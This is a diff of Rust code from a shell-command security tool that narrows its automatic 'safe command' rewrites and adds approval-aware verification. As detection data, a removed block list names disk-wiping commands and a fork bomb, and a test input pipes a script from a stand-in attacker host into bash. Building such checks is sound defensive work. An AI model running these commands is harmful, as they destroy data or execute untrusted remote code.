@@ -10,12 +10,11 @@
 //!
 //! [`SafeSuggestion::safe_command`] is the only executable rewrite channel.
 //!
-//! Eight mechanically scoped transformations, each requiring whole-command
-//! verification before executable use: pipe-to-shell
-//! (hardened `tirith run --capsule`), insecure TLS flag (drop it), plain HTTP→HTTPS,
-//! typosquat (`<pm> install <target>`), sudo narrow (drop `sudo` when the inner
-//! command is `Allow`), env scrub (`env -u VAR …`), archive list-before-extract,
-//! and dotfile backup-then-redirect.
+//! Mechanical candidates require whole-command effective verification before
+//! executable use. Pipe-to-shell delegates to hardened `tirith run --capsule`;
+//! archive/dotfile rewrites retain narrow modeled shapes. TLS, HTTP, typosquat,
+//! sudo, and environment findings are guidance-only because shell/tool option
+//! semantics cannot be safely reconstructed from the current token model.
 
 use std::collections::{HashSet, VecDeque};
 use std::path::Path;
@@ -117,7 +116,8 @@ pub fn suggest_verified(ctx: &AnalysisContext, verdict: &Verdict) -> Vec<SafeSug
 /// Every mechanical candidate is re-analyzed byte-for-byte with the original
 /// shell, scan context, cwd, and policy object. Compatible transformations are
 /// composed with a bounded breadth-first search. Only the shortest final
-/// command whose action is [`Action::Allow`] remains in a `safe_command` field.
+/// command whose effective action is [`Action::Allow`] and has no pending
+/// approval remains in a `safe_command` field.
 /// All other transformations are retained as static guidance, with their
 /// candidate command removed from structured output.
 pub fn suggest_verified_with_policy(
@@ -125,8 +125,27 @@ pub fn suggest_verified_with_policy(
     verdict: &Verdict,
     policy: &Policy,
 ) -> Vec<SafeSuggestion> {
+    let session_id = crate::session::resolve_session_id();
+    suggest_verified_with_policy_and_session(ctx, verdict, policy, &session_id)
+}
+
+/// Session-bound variant used by enforcement callers that already resolved the
+/// current session. Candidate verification is read-only, but observes the same
+/// escalation/correlation history as the original verdict.
+pub fn suggest_verified_with_policy_and_session(
+    ctx: &AnalysisContext,
+    verdict: &Verdict,
+    policy: &Policy,
+    session_id: &str,
+) -> Vec<SafeSuggestion> {
     let trusted_runner = trusted_current_tirith_path();
-    suggest_verified_with_policy_and_runner(ctx, verdict, policy, trusted_runner.as_deref())
+    suggest_verified_with_policy_and_runner(
+        ctx,
+        verdict,
+        policy,
+        trusted_runner.as_deref(),
+        session_id,
+    )
 }
 
 fn suggest_verified_with_policy_and_runner(
@@ -134,6 +153,7 @@ fn suggest_verified_with_policy_and_runner(
     verdict: &Verdict,
     policy: &Policy,
     trusted_runner: Option<&Path>,
+    session_id: &str,
 ) -> Vec<SafeSuggestion> {
     let mut suggestions =
         suggest_candidates_with_runner(ctx, verdict, Some(policy), trusted_runner);
@@ -173,6 +193,10 @@ fn suggest_verified_with_policy_and_runner(
         }
     }
 
+    let candidate_origin = verdict
+        .agent_origin
+        .clone()
+        .unwrap_or_else(|| crate::agent_origin::resolve_cli_origin(ctx.interactive));
     let mut examined = 0usize;
     let mut verified: Option<Candidate> = None;
     while let Some(candidate) = queue.pop_front() {
@@ -185,8 +209,31 @@ fn suggest_verified_with_policy_and_runner(
         // Never let a process/inline bypass or a policy-file race bless an
         // executable suggestion. Every candidate uses the original resolved
         // policy object; no policy discovery occurs in this loop.
-        let candidate_verdict = engine::analyze_with_policy_without_bypass(&candidate_ctx, policy);
-        if candidate_verdict.action == Action::Allow {
+        let mut candidate_raw = engine::analyze_with_policy_without_bypass(&candidate_ctx, policy);
+        let runtime_findings = crate::threatdb_api::enrich_command(
+            &candidate.command,
+            candidate_ctx.shell,
+            &policy.threat_intel,
+            crate::threatdb_api::RuntimeThreatMode::Inline,
+        );
+        if !runtime_findings.is_empty() {
+            candidate_raw.findings.extend(runtime_findings);
+            candidate_raw.action = crate::verdict::upgraded_action_from_findings(
+                &candidate_raw.findings,
+                candidate_raw.action,
+            );
+        }
+        candidate_raw.agent_origin = Some(candidate_origin.clone());
+        let candidate_verdict = crate::escalation::post_process_verdict_for_verification(
+            &candidate_raw,
+            policy,
+            &candidate.command,
+            session_id,
+            crate::escalation::CallerContext::Cli,
+        );
+        if candidate_verdict.action == Action::Allow
+            && candidate_verdict.requires_approval != Some(true)
+        {
             verified = Some(candidate);
             break;
         }
@@ -233,11 +280,11 @@ fn suggest_verified_with_policy_and_runner(
             .iter_mut()
             .find(|suggestion| suggestion.rule_id == anchor_rule);
         let rationale = if verified.rule_path.len() == 1 {
-            "The exact final command re-analyzed to Allow under the same shell, context, and policy."
+            "The exact final command reached effective Allow under the same shell, context, origin, session, and policy."
                 .to_string()
         } else {
             format!(
-                "Composes compatible remediations for {}; the exact final command re-analyzed to Allow under the same shell, context, and policy.",
+                "Composes compatible remediations for {}; the exact final command reached effective Allow under the same shell, context, origin, session, and policy.",
                 verified.rule_path.join(", ")
             )
         };
@@ -349,47 +396,30 @@ fn build_suggestion(
                     .to_string(),
             ),
         },
-        RuleId::InsecureTlsFlags => match rewrite_drop_insecure_tls(cmd, segments) {
-            Some(rewrite) => (
-                Some(rewrite),
-                "Drops the flag that disables TLS certificate verification, restoring \
-                 protection against man-in-the-middle tampering."
-                    .to_string(),
-            ),
-            None => (
-                None,
-                "Remove the insecure TLS flag (-k / --insecure / --no-check-certificate) \
-                 so the certificate is verified."
-                    .to_string(),
-            ),
-        },
-        RuleId::PlainHttpToSink => match rewrite_http_to_https(cmd) {
-            Some(rewrite) => (
-                Some(rewrite),
-                "Switches the URL to HTTPS so the download is encrypted and \
-                 tamper-evident — verify the host actually serves HTTPS."
-                    .to_string(),
-            ),
-            None => (
-                None,
-                "Fetch the URL over HTTPS instead of plain HTTP.".to_string(),
-            ),
-        },
-        RuleId::ThreatPackageTyposquat => match rewrite_typosquat(segments, shell, finding) {
-            Some(rewrite) => (
-                Some(rewrite),
-                "Replaces the typosquatted package name with the popular package the \
-                 threat database identifies it as impersonating."
-                    .to_string(),
-            ),
-            None => (
-                None,
-                "The threat database flagged this name as a typosquat but did not \
-                 unambiguously name a single popular target — pick the legitimate \
-                 package by hand."
-                    .to_string(),
-            ),
-        },
+        // TLS flags can be option values (for example `curl --data -k`), and a
+        // URL-looking curl argument can belong to `--header`/`--data` rather
+        // than the fetch destination. Without a complete tool-option grammar,
+        // either deletion/replacement can change semantics. Keep both families
+        // guidance-only instead of guessing an executable argv rewrite.
+        RuleId::InsecureTlsFlags => (
+            None,
+            "Remove the insecure TLS flag (-k / --insecure / --no-check-certificate) \
+             from the exact downloader option position so certificates remain verified."
+                .to_string(),
+        ),
+        RuleId::PlainHttpToSink => (
+            None,
+            "Fetch the actual destination URL over HTTPS instead of plain HTTP; verify \
+             the host serves the same resource before changing it."
+                .to_string(),
+        ),
+        RuleId::ThreatPackageTyposquat => (
+            None,
+            "The threat database flagged this name as a typosquat. Confirm the legitimate \
+             package and its ecosystem-specific name by hand; package-manager option grammar \
+             makes an automatic operand substitution unsafe."
+                .to_string(),
+        ),
         RuleId::ArchiveExtract => match rewrite_archive_list_first(segments, shell) {
             Some(rewrite) => (
                 Some(rewrite),
@@ -882,179 +912,7 @@ fn supported_fetch_url(command: &str, args: &[String]) -> Option<String> {
     Some(url)
 }
 
-/// Remove insecure TLS flags, preserving everything else verbatim.
-///
-/// Byte-span splicing: removes each whitespace-delimited run whose content
-/// (quotes stripped) is exactly an insecure flag, plus one adjacent gap. These
-/// flags have no internal whitespace, so quoted args with spaces are untouched.
-/// `None` if no flag is present, or if the segment-level view (the detector's)
-/// doesn't also see one — so a `-k` buried in a quoted string is never rewritten.
-fn rewrite_drop_insecure_tls(cmd: &str, segments: &[tokenize::Segment]) -> Option<String> {
-    const INSECURE: &[&str] = &["-k", "--insecure", "--no-check-certificate"];
-
-    // Cross-check the tokenizer: rewrite only when a real arg token is an
-    // insecure flag, not when `-k` appears inside another argument.
-    let detector_sees_it = segments.iter().any(|seg| {
-        seg.args
-            .iter()
-            .any(|a| INSECURE.contains(&strip_quotes(a).as_str()))
-    });
-    if !detector_sees_it {
-        return None;
-    }
-
-    // Byte spans of whitespace-delimited runs that are insecure flags.
-    let bytes = cmd.as_bytes();
-    let mut spans: Vec<(usize, usize)> = Vec::new();
-    let mut i = 0;
-    while i < bytes.len() {
-        if bytes[i].is_ascii_whitespace() {
-            i += 1;
-            continue;
-        }
-        let start = i;
-        while i < bytes.len() && !bytes[i].is_ascii_whitespace() {
-            i += 1;
-        }
-        let run = &cmd[start..i];
-        if INSECURE.contains(&strip_quotes(run).as_str()) {
-            spans.push((start, i));
-        }
-    }
-    if spans.is_empty() {
-        return None;
-    }
-
-    // Rebuild the command, dropping each flagged span plus the single
-    // preceding space so `curl -k URL` collapses to `curl URL`.
-    let mut out = String::with_capacity(cmd.len());
-    let mut cursor = 0;
-    for (start, end) in spans {
-        let mut keep_until = start;
-        if keep_until > cursor && bytes[keep_until - 1].is_ascii_whitespace() {
-            keep_until -= 1;
-        }
-        out.push_str(&cmd[cursor..keep_until]);
-        cursor = end;
-    }
-    out.push_str(&cmd[cursor..]);
-    let result = out.trim().to_string();
-    if result.is_empty() || result == cmd.trim() {
-        return None;
-    }
-    Some(result)
-}
-
-/// Rewrite the first `http://` URL in the command to `https://`. `None` if
-/// there's no plain-HTTP URL. The caller adds the caveat that the host must
-/// actually serve HTTPS.
-fn rewrite_http_to_https(cmd: &str) -> Option<String> {
-    // Case-insensitive `http://` not preceded by 's' (so `https://` is skipped).
-    let lower = cmd.to_ascii_lowercase();
-    let bytes = lower.as_bytes();
-    let mut idx = 0;
-    while let Some(rel) = lower[idx..].find("http://") {
-        let pos = idx + rel;
-        let preceded_by_s = pos > 0 && (bytes[pos - 1] == b's' || bytes[pos - 1] == b'S');
-        if !preceded_by_s {
-            let mut rewritten = String::with_capacity(cmd.len() + 1);
-            rewritten.push_str(&cmd[..pos + 4]); // up to and including "http"
-            rewritten.push('s');
-            rewritten.push_str(&cmd[pos + 4..]);
-            return Some(rewritten);
-        }
-        idx = pos + 7;
-    }
-    None
-}
-
 // ── Typosquat rewrite ───────────────────────────────────────────────────────
-
-/// Extract the typosquat target name from a `ThreatPackageTyposquat` finding.
-/// Both producers format the title as `"Confirmed typosquat: <name> →
-/// <target>"`; `install_txn.rs` also stamps `typosquat_of=<target>` into the
-/// evidence, checked as a backup against a future title tweak.
-fn typosquat_target(finding: &Finding) -> Option<String> {
-    // Primary parse from the title — `→` is BMP so byte-indexing is safe.
-    let arrow = " → ";
-    if let Some(idx) = finding.title.find(arrow) {
-        let target = finding.title[idx + arrow.len()..].trim();
-        if !target.is_empty() && !target.contains(char::is_whitespace) {
-            return Some(target.to_string());
-        }
-    }
-
-    // Backup parse: install_txn evidence carries `typosquat_of=<name>`.
-    for ev in &finding.evidence {
-        if let crate::verdict::Evidence::Text { detail } = ev {
-            if let Some(pos) = detail.find("typosquat_of=") {
-                let after = &detail[pos + "typosquat_of=".len()..];
-                let end = after
-                    .find(|c: char| c.is_ascii_whitespace())
-                    .unwrap_or(after.len());
-                let target = after[..end].trim();
-                if !target.is_empty() {
-                    return Some(target.to_string());
-                }
-            }
-        }
-    }
-
-    None
-}
-
-/// Package-manager `install` shape detector → `(pm_binary, install_verb)` when
-/// `segments` is one segment whose leader is a recognized PM and the first
-/// non-flag arg is an install verb (preserved, so `npm i` stays `npm i`). The
-/// supported set mirrors the install-txn engine pass; others get no rewrite.
-fn detect_pm_install(segments: &[tokenize::Segment], shell: ShellType) -> Option<(String, String)> {
-    if segments.len() != 1 {
-        return None;
-    }
-    let seg = &segments[0];
-    let cmd = base_command(seg.command.as_deref()?, shell);
-    let install_verbs: &[(&str, &[&str])] = &[
-        ("pip", &["install"]),
-        ("pip3", &["install"]),
-        ("npm", &["install", "i", "add"]),
-        ("yarn", &["add"]),
-        ("pnpm", &["add", "install", "i"]),
-        ("cargo", &["install", "add"]),
-        ("gem", &["install"]),
-        ("go", &["install", "get"]),
-    ];
-
-    let (_, verbs) = install_verbs.iter().find(|(name, _)| *name == cmd)?;
-    let verb_arg = seg
-        .args
-        .iter()
-        .find(|a| !strip_quotes(a).starts_with('-'))?;
-    let verb = strip_quotes(verb_arg);
-    if !verbs.contains(&verb.as_str()) {
-        return None;
-    }
-    Some((cmd, verb))
-}
-
-/// Build a typosquat rewrite when the target is unambiguous. `None` when the
-/// finding exposes no single target, or the command isn't a recognized `<pm>
-/// install <name>` (the only shape we can mechanically rewrite).
-fn rewrite_typosquat(
-    segments: &[tokenize::Segment],
-    shell: ShellType,
-    finding: &Finding,
-) -> Option<String> {
-    let target = typosquat_target(finding)?;
-    let target = sanitize_for_display(&target);
-    if target.is_empty() {
-        return None;
-    }
-    // The target name is parsed out of an untrusted finding title / evidence;
-    // single-quote it so it can't inject shell syntax into `<pm> install …`.
-    let target = shell_single_quote(&target)?;
-    let (pm, verb) = detect_pm_install(segments, shell)?;
-    Some(format!("{pm} {verb} {target}"))
-}
 
 // ── Archive list-before-extract ────────────────────────────────────────────
 
@@ -1235,207 +1093,36 @@ fn rewrite_dotfile_backup_first(
 
 // ── Sudo narrow (command-shape based) ──────────────────────────────────────
 
-/// Interactive shells that must never be the "narrowed" base of a `sudo`
-/// rewrite — suggesting `sh` for `sudo sh` still yields a root shell and drops
-/// the visible `sudo` cue.
-fn is_interactive_shell(name: &str) -> bool {
-    matches!(
-        name,
-        "sh" | "bash" | "zsh" | "fish" | "dash" | "ksh" | "tcsh" | "pwsh" | "powershell" | "nu"
-    )
-}
-
-/// Heuristic catch-all for destructive command shapes the engine doesn't model
-/// but where dropping `sudo` is obviously wrong (e.g. `rm -rf /` still danger
-/// just as the current user). The suggester's stricter mandate: never produce a
-/// rewrite a reviewer would call worse than `--help`.
-fn looks_obviously_destructive(inner: &str) -> bool {
-    // Normalize whitespace runs, then match against the LEADING segment only.
-    let collapsed: String = inner.split_whitespace().collect::<Vec<_>>().join(" ");
-    let lower = collapsed.to_ascii_lowercase();
-    let triggers = [
-        "rm -rf /",
-        "rm -rf /*",
-        "rm -fr /",
-        "rm -fr /*",
-        "rm -rf ~",
-        "rm -rf $home",
-        "rm -rf --no-preserve-root",
-        "rm --no-preserve-root -rf /",
-        "dd if=/dev/zero of=/dev/sd",
-        "mkfs ",
-        ":(){ :|:&};:",
-    ];
-    triggers.iter().any(|t| lower.starts_with(t))
-}
-
-/// Strip a leading `sudo`, returning the inner command as raw text (quoting /
-/// spacing preserved). `None` when no inner command can be located. Handles
-/// common option flags (`-u USER`, `--user=USER`, `--`); exotic flags fall
-/// through to no-rewrite rather than risk a wrong strip.
-fn strip_sudo_prefix(cmd: &str, shell: ShellType) -> Option<String> {
-    let segs = tokenize::tokenize(cmd, shell);
-    let seg = segs.first()?;
-    let leader = base_command(seg.command.as_deref()?, shell);
-    if leader != "sudo" {
-        return None;
-    }
-
-    let value_short = ["-u", "-g", "-C", "-D", "-R", "-T"];
-    let value_long = [
-        "--user",
-        "--group",
-        "--close-from",
-        "--chdir",
-        "--role",
-        "--type",
-        "--other-user",
-        "--host",
-        "--timeout",
-    ];
-
-    let mut idx = 0;
-    let mut start_arg = None;
-    while idx < seg.args.len() {
-        let arg = strip_quotes(&seg.args[idx]);
-        if arg == "--" {
-            start_arg = Some(idx + 1);
-            break;
-        }
-        if arg.starts_with("--") {
-            if value_long.iter().any(|f| arg == *f) {
-                idx += 2;
-            } else {
-                // `--flag=value` consumes one slot.
-                idx += 1;
-            }
-            continue;
-        }
-        if arg.starts_with('-') && arg.len() > 1 {
-            if value_short.iter().any(|f| arg == *f) {
-                idx += 2;
-            } else {
-                idx += 1;
-            }
-            continue;
-        }
-        start_arg = Some(idx);
-        break;
-    }
-
-    let start = start_arg?;
-    if start >= seg.args.len() {
-        return None;
-    }
-    // Reassemble from the raw segment so quoting is preserved verbatim: find
-    // where the first inner-arg token begins and return everything onward.
-    let first_arg = &seg.args[start];
-    let stripped = strip_quotes(first_arg);
-    let raw = &seg.raw;
-    let pos = raw
-        .find(first_arg.as_str())
-        .or_else(|| raw.find(stripped.as_str()))?;
-    Some(raw[pos..].trim().to_string())
-}
-
-/// Build the sudo-narrow suggestion. Fires when: (i) the leader is `sudo`,
-/// (ii) the verdict has a finding (caller-checked), (iii) the stripped leader
-/// is NOT an interactive shell, and (iv) re-analyzing the inner command yields
-/// [`Action::Allow`].
-///
-/// (iii) failing returns a `safe_command: None` interactive-shell suggestion;
-/// (iv) failing returns `None` (per-finding suggestions already cover it).
+/// Sudo rewrites are guidance-only. Removing `sudo` changes command lookup
+/// (secure_path, aliases/functions, and option parsing) and therefore cannot be
+/// proven equivalent from Tirith's shell-token model. Keeping the suggestion
+/// visible without an executable field is safer than guessing an inner span.
 fn build_sudo_narrow_suggestion(
     ctx: &AnalysisContext,
     segments: &[tokenize::Segment],
     _verdict: &Verdict,
-    policy: Option<&Policy>,
+    _policy: Option<&Policy>,
 ) -> Option<SafeSuggestion> {
-    let cmd = &ctx.input;
     let shell = ctx.shell;
     let leader = base_command(segments.first()?.command.as_deref()?, shell);
     if leader != "sudo" {
         return None;
     }
-
-    let inner = strip_sudo_prefix(cmd, shell)?;
-    if inner.is_empty() {
-        return None;
-    }
-
-    // (iii) interactive-shell trip wire on the stripped leader.
-    let inner_segs = tokenize::tokenize(&inner, shell);
-    let inner_leader = inner_segs
-        .first()
-        .and_then(|s| s.command.as_deref())
-        .map(|c| base_command(c, shell))
-        .unwrap_or_default();
-    if is_interactive_shell(&inner_leader) {
-        return Some(SafeSuggestion {
-            rule_id: "sudo_narrow".to_string(),
-            safe_command: None,
-            rationale: "no safe mechanical rewrite available; avoid interactive root shells — \
-                 run the specific non-privileged command you intended, or use sudo only \
-                 for the minimal command that requires elevation."
-                .to_string(),
-            remediation: "Identify the single command that needs elevation, then prefix only \
-                          that command with sudo. Don't run an interactive root shell."
-                .to_string(),
-        });
-    }
-
-    // Refuse obvious shell-builtin destructiveness (`rm -rf /`) before
-    // re-analysis — the engine doesn't model these, but the suggester must not
-    // advise something worse than the original.
-    if looks_obviously_destructive(&inner) {
-        return None;
-    }
-
-    // (iv) re-analyze the stripped command; if it still flags, sudo wasn't the
-    // dangerous part — per-finding suggestions cover it.
-    let inner_ctx = context_with_input(ctx, inner.clone());
-    let inner_verdict = match policy {
-        Some(snapshot) => engine::analyze_with_policy_without_bypass(&inner_ctx, snapshot),
-        None => engine::analyze_without_bypass_returning_policy(&inner_ctx).0,
-    };
-    if inner_verdict.action != Action::Allow {
-        return None;
-    }
-
     Some(SafeSuggestion {
         rule_id: "sudo_narrow".to_string(),
-        safe_command: Some(inner),
-        rationale: "The command is safe to run without sudo — dropping the sudo prefix \
-                    removes a privilege the inner command does not require."
+        safe_command: None,
+        rationale: "No safe mechanical rewrite is available: sudo option grammar and \
+                    secure_path can resolve a different executable than the caller's shell. \
+                    Avoid interactive root shells and narrow elevation manually."
             .to_string(),
-        remediation: "Re-run the command without sudo. If the underlying tool genuinely \
-                      needs root, narrow sudo to only the minimal command that does."
+        remediation: "Identify the exact absolute executable and minimal operation that needs \
+                      elevation, then apply sudo only to that operation. Don't run an \
+                      interactive root shell."
             .to_string(),
     })
 }
 
 // ── Env scrub (command-shape based) ────────────────────────────────────────
-
-/// Currently-set sensitive env vars in stable (deterministic) order. The
-/// effective list MERGES the built-in `sensitive_env.toml` names with the user's
-/// `policy.env_guard_sensitive_vars` (M9 ch4) so an `env -u …` rewrite never
-/// silently omits a user-declared secret. Verified callers reuse their captured
-/// snapshot; the private raw-candidate test path discovers a partial policy.
-fn sensitive_env_set_in_process(cwd: Option<&str>, policy: Option<&Policy>) -> Vec<String> {
-    let discovered;
-    let policy = match policy {
-        Some(snapshot) => snapshot,
-        None => {
-            discovered = Policy::discover_partial(cwd);
-            &discovered
-        }
-    };
-    let effective = crate::env_guard::effective_sensitive_vars(&policy.env_guard_sensitive_vars);
-    effective
-        .into_iter()
-        .filter(|name| std::env::var_os(name).is_some_and(|v| !v.is_empty()))
-        .collect()
-}
 
 /// `true` when `cmd` is a single simple command that `env -u VAR … <cmd>` can
 /// safely wrap. `env -u` only scrubs the immediately-following process — any
@@ -1446,6 +1133,7 @@ fn sensitive_env_set_in_process(cwd: Option<&str>, policy: Option<&Policy>) -> V
 /// Scans byte-by-byte tracking quote/escape state: single quotes make contents
 /// literal; in double quotes only `$`/`` ` ``/`\` retain meaning, so command
 /// substitution (`` ` ``, `$(`) is flagged outside single quotes only.
+#[cfg(test)]
 fn is_simple_command_for_env_scrub(cmd: &str) -> bool {
     // Both quote flags can't be true at once — POSIX doesn't nest the two.
     let mut in_single = false;
@@ -1482,7 +1170,7 @@ fn is_simple_command_for_env_scrub(cmd: &str) -> bool {
                 b'"' => in_double = false,
                 // Command substitution is active even inside double quotes.
                 b'`' => return false,
-                b'$' if i + 1 < bytes.len() && bytes[i + 1] == b'(' => return false,
+                b'$' => return false,
                 _ => {}
             }
             i += 1;
@@ -1493,8 +1181,8 @@ fn is_simple_command_for_env_scrub(cmd: &str) -> bool {
         match b {
             b'\'' => in_single = true,
             b'"' => in_double = true,
-            b'|' | b'&' | b';' | b'>' | b'<' | b'(' | b')' | b'`' => return false,
-            b'$' if i + 1 < bytes.len() && bytes[i + 1] == b'(' => return false,
+            b'|' | b'&' | b';' | b'>' | b'<' | b'(' | b')' | b'`' | b'\n' | b'\r' => return false,
+            b'$' => return false,
             _ => {}
         }
         i += 1;
@@ -1505,19 +1193,17 @@ fn is_simple_command_for_env_scrub(cmd: &str) -> bool {
     !(in_single || in_double || escape)
 }
 
-/// Build an env-scrub suggestion when: (i) the dedicated
-/// [`RuleId::EnvSensitiveExposedToUnknownScript`] finding is present (M9 ch4) OR
-/// any High-severity finding is (M6 ch5, kept for compat); (ii) a sensitive env
-/// var is set in this process; (iii) the shell is POSIX (`env -u` doesn't exist
-/// on PowerShell); and (iv) the command is a single simple command (else a
-/// compound construct would leak the secret — see
-/// [`is_simple_command_for_env_scrub`]). `None` otherwise.
+/// Build guidance for scrubbing sensitive environment variables. This is never
+/// an executable rewrite: a parent shell expands `$VAR` before `env` runs,
+/// `env -u` is not portable across Tirith's supported shells, policy-controlled
+/// variable names need a typed argv boundary, and shell builtins/functions
+/// cannot be wrapped without semantic drift.
 fn build_env_scrub_suggestion(
-    cmd: &str,
-    shell: ShellType,
+    _cmd: &str,
+    _shell: ShellType,
     verdict: &Verdict,
-    cwd: Option<&str>,
-    policy: Option<&Policy>,
+    _cwd: Option<&str>,
+    _policy: Option<&Policy>,
 ) -> Option<SafeSuggestion> {
     // Fire on the dedicated M9 ch4 rule (explicit, audit-visible) OR any
     // High-severity finding (M6 ch5 compat heuristic).
@@ -1533,42 +1219,16 @@ fn build_env_scrub_suggestion(
         return None;
     }
 
-    // `env -u VAR …` is POSIX-only; the PowerShell equivalent can't be a single
-    // inline command without mutating the caller's session env. Decline rather
-    // than ship a broken rewrite (the per-rule remediation covers PowerShell).
-    if shell == ShellType::PowerShell {
-        return None;
-    }
-
-    let set_vars = sensitive_env_set_in_process(cwd, policy);
-    if set_vars.is_empty() {
-        return None;
-    }
-
-    // A compound construct would leak the secret through later stages.
-    if !is_simple_command_for_env_scrub(cmd.trim()) {
-        return None;
-    }
-
-    let mut rewrite = String::from("env");
-    for var in &set_vars {
-        rewrite.push_str(" -u ");
-        rewrite.push_str(var);
-    }
-    rewrite.push(' ');
-    rewrite.push_str(cmd.trim());
-
     Some(SafeSuggestion {
         rule_id: "env_scrub".to_string(),
-        safe_command: Some(rewrite),
-        rationale: format!(
-            "Unsets {} sensitive env var(s) currently in your environment before \
-             running the command, so a malicious script cannot exfiltrate them.",
-            set_vars.len()
-        ),
-        remediation: "Unset sensitive environment variables (API tokens, cloud credentials) \
-                      before running untrusted commands, or use `env -u VAR ...` to scrub them \
-                      for a single invocation."
+        safe_command: None,
+        rationale: "No safe shell-string rewrite is available: variable expansion happens in \
+                    the parent shell, and unset syntax differs by shell. Use a typed environment \
+                    boundary or a clean subshell/container instead."
+            .to_string(),
+        remediation: "Run the command in a clean environment or containment boundary that passes \
+                      only an explicit allowlist of variables. Do not interpolate secrets into \
+                      the command line."
             .to_string(),
     })
 }
@@ -1712,6 +1372,14 @@ mod tests {
         }
     }
 
+    fn plain_http_finding(url: &str) -> Finding {
+        let mut finding = finding(RuleId::PlainHttpToSink);
+        finding.evidence = vec![Evidence::Url {
+            raw: url.to_string(),
+        }];
+        finding
+    }
+
     fn verdict_with(findings: Vec<Finding>) -> Verdict {
         Verdict::from_findings(findings, 3, Timings::default())
     }
@@ -1776,6 +1444,64 @@ mod tests {
                 .any(|finding| finding.rule_id == RuleId::CustomRuleMatch),
             "snapshot re-analysis must retain the removed custom rule: {candidate_verdict:?}"
         );
+    }
+
+    #[test]
+    fn effective_allow_with_pending_approval_never_becomes_executable() {
+        let ctx = default_exec_context("tar -xzf archive.tar.gz", ShellType::Posix);
+        let mut policy = Policy::default();
+        policy
+            .severity_overrides
+            .insert("archive_extract".to_string(), Severity::Info);
+        policy.approval_rules.push(crate::policy::ApprovalRule {
+            rule_ids: vec!["archive_extract".to_string()],
+            timeout_secs: 30,
+            fallback: "block".to_string(),
+        });
+        let mut raw = engine::analyze_with_policy_without_bypass(&ctx, &policy);
+        raw.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
+        let effective = crate::escalation::post_process_verdict_for_verification(
+            &raw,
+            &policy,
+            &ctx.input,
+            "safe-command-pending-approval",
+            crate::escalation::CallerContext::Cli,
+        );
+        assert_eq!(effective.action, Action::Allow);
+        assert_eq!(effective.requires_approval, Some(true));
+
+        let suggestions = suggest_verified_with_policy_and_runner(
+            &ctx,
+            &effective,
+            &policy,
+            None,
+            "safe-command-pending-approval",
+        );
+        assert!(suggestions
+            .iter()
+            .all(|suggestion| suggestion.safe_command.is_none()));
+    }
+
+    #[test]
+    fn agent_rule_denial_blocks_raw_allow_candidate() {
+        let ctx = default_exec_context("tar -xzf archive.tar.gz", ShellType::Posix);
+        let mut policy = Policy::default();
+        policy.agent_rules.deny.push(crate::policy::AgentMatcher {
+            kind: crate::agent_origin::AgentOriginKind::Human,
+            ..Default::default()
+        });
+        let mut verdict = engine::analyze_with_policy_without_bypass(&ctx, &policy);
+        verdict.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
+        let suggestions = suggest_verified_with_policy_and_runner(
+            &ctx,
+            &verdict,
+            &policy,
+            None,
+            "safe-command-agent-deny",
+        );
+        assert!(suggestions
+            .iter()
+            .all(|suggestion| suggestion.safe_command.is_none()));
     }
 
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
@@ -1907,6 +1633,7 @@ mod tests {
             &verdict,
             &policy,
             Some(Path::new("/usr/local/bin/tirith")),
+            "safe-command-runner-policy-test",
         );
         let command = suggestions
             .iter()
@@ -1928,7 +1655,7 @@ mod tests {
 
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
-    fn trusted_runner_composes_tls_transport_and_pipe_fixes_into_one_allow_command() {
+    fn tls_http_pipe_chain_is_guidance_only_without_tool_option_proof() {
         let ctx = default_exec_context(
             "curl -k -fsSL http://attacker.invalid/script | bash",
             ShellType::Posix,
@@ -1941,21 +1668,11 @@ mod tests {
             &verdict,
             &policy,
             Some(Path::new("/usr/local/bin/tirith")),
+            "safe-command-runner-compose-test",
         );
-        let command = suggestions
+        assert!(suggestions
             .iter()
-            .find_map(|suggestion| suggestion.safe_command.as_deref())
-            .expect("one fully composed runner command");
-        assert_injected_tirith_prefix(command, ShellType::Posix);
-        assert!(command.ends_with(
-            " run --capsule --script-stdin --interpreter bash 'https://attacker.invalid/script'"
-        ));
-        assert!(!command.contains("curl "));
-        assert!(!command.contains(" -k"));
-
-        let candidate_ctx = context_with_input(&ctx, command.to_string());
-        let candidate = engine::analyze_with_policy_without_bypass(&candidate_ctx, &policy);
-        assert_eq!(candidate.action, Action::Allow);
+            .all(|suggestion| suggestion.safe_command.is_none()));
     }
 
     #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
@@ -2010,64 +1727,38 @@ mod tests {
     }
 
     #[test]
-    fn insecure_tls_flag_dropped() {
-        let cmd = "curl -k https://example.com/install.sh";
-        let v = verdict_with(vec![finding(RuleId::InsecureTlsFlags)]);
-        let s = suggest(cmd, ShellType::Posix, &v);
-        let sc = s[0].safe_command.as_deref().unwrap();
-        assert_eq!(sc, "curl https://example.com/install.sh");
-    }
-
-    #[test]
-    fn insecure_tls_long_flag_dropped() {
-        let cmd = "wget --no-check-certificate https://example.com/x";
-        let v = verdict_with(vec![finding(RuleId::InsecureTlsFlags)]);
-        let s = suggest(cmd, ShellType::Posix, &v);
-        let sc = s[0].safe_command.as_deref().unwrap();
-        assert_eq!(sc, "wget https://example.com/x");
-    }
-
-    #[test]
-    fn insecure_tls_drop_preserves_quoted_arg_with_spaces() {
-        // Span-based deletion must not mangle a quoted arg with whitespace.
-        let cmd = r#"curl -k --data "a b c" https://example.com/x"#;
-        let v = verdict_with(vec![finding(RuleId::InsecureTlsFlags)]);
-        let s = suggest(cmd, ShellType::Posix, &v);
-        let sc = s[0].safe_command.as_deref().unwrap();
-        assert_eq!(sc, r#"curl --data "a b c" https://example.com/x"#);
-    }
-
-    #[test]
-    fn insecure_tls_drop_handles_flag_in_middle() {
-        let cmd = "curl https://example.com/x -k -o out";
-        let v = verdict_with(vec![finding(RuleId::InsecureTlsFlags)]);
-        let s = suggest(cmd, ShellType::Posix, &v);
-        let sc = s[0].safe_command.as_deref().unwrap();
-        assert_eq!(sc, "curl https://example.com/x -o out");
-    }
-
-    #[test]
-    fn insecure_tls_k_inside_quoted_string_not_rewritten() {
-        // `-k` only appears inside a quoted payload — the tokenizer cross-check
-        // must prevent a rewrite.
-        let cmd = r#"curl --data "pass -k here" https://example.com/x"#;
-        let segs = tokenize::tokenize(cmd, ShellType::Posix);
-        assert!(rewrite_drop_insecure_tls(cmd, &segs).is_none());
-    }
-
-    #[test]
-    fn plain_http_rewritten_to_https() {
